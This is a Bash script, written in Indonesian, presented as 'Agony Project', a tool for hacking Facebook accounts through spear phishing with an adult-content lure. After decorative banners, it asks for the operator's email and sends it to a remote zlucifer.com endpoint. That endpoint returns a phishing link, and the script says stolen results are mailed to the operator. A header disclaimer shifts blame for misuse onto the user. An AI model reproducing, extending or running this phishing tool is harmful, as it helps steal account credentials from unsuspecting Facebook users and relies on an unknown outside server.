#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
agony(){
      clear
      echo "         ,.*====.   '.       .'   .====*., "
      sleep 0.03
      echo "        .-  /c)}}},    :...:    ,{{{(c\  -. "
      sleep 0.03
      echo "    _.-'-6>   {{{{{'''        '''}}}}}   <9-'-._ "
      sleep 0.03
      echo "   t         |}}}}}}           {{{{{{|         y "
      sleep 0.03
      echo "    \__.___.'{{{{{{{           }}}}}}}'.___.__/ "
      sleep 0.03
      echo "         [__/}}}}}}}}         {{{{{{{{\__]  "
      sleep 0.03
      echo "         {{{.'      '-._   _.-'      '.}}} "
      sleep 0.03
      echo "         }}/                           \{{ "
      sleep 0.03
      echo "         {{|       AGONY Project       |}} "
      sleep 0.03
      echo "         }}|       =============       |{{ "
      sleep 0.03
      echo "  .------{{{\    ,               ,    /}}}------. "
      sleep 0.03
      echo " //.--------'    ;               ;   '---------.\\ "
      sleep 0.03
      echo "((///  _          \             /          _  \\\)) "
      sleep 0.03
      echo " (((--'  ''-------' ' '-----' ' '-------''  '--))) "
      sleep 0.03
}
load(){
      echo -e "\n"
      bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
      barlength=${#bar}
      i=0
      while((i<100)); do
          n=$((i*barlength / 100))
          printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
          ((i += RANDOM%5+2))
          sleep 0.2
      done
}
encrypt_mail=$(curl -s http://zlucifer.com/api/hackbae.php?request=agony)
mulai(){
      clear
      agony
      echo " ================================================="
      echo "Masukan email kamu"
      read email
      echo
      echo "Apakah email "$email "sudah benar?"
      echo "y/n?"
      read cek_email
      if [ $cek_email = "y" ]; then
            clear
            echo "Membuat link.."
            load
            agony
            create=`curl -s $encrypt_mail/base64_maker.php?email=$email`
            echo " ================================================="
            echo -e $create
            echo "Result otomatis masuk ke email kamu"
            echo " ================================================="
      else
            mulai
      fi
}
clear
echo "Loading.."
load
agony
echo " ================================================="
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
clear
agony
echo " ================================================="
sleep 2
echo " Agony Project adalah tools untuk meretas Facebook"
sleep 0.2
echo "   Tools ini adalah Spear Phising method Advanced"
sleep 0.2
echo "            Menggunakan teknik 18+"
sleep 0.2
echo "       Result otomatis masuk ke email kamu"
sleep 0.03
echo " ================================================="
echo Selamat datang $nick ":)"
echo
echo "Mulai Agony Project?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      clear
      echo "Memulai Agony Project.."
      load
      mulai
else
      echo "Kesalahan"
fi
